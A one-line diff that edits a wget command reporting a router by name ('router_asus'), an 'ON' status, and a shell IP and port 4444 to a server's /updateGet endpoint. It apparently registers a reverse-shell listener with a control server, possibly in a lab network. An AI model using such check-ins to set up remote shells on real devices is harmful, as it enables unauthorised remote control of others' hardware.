@@ -1,1 +1,1 @@
-wget -O- "http://192.168.31.108:5000/updateGet?name=router_asus2&status=ON&shellIP=10.0.0.149&shellPort=4444&"
+wget -O- "http://192.168.31.108:5000/updateGet?name=router_asus&status=ON&shellIP=192.168.31.127&shellPort=4444&"
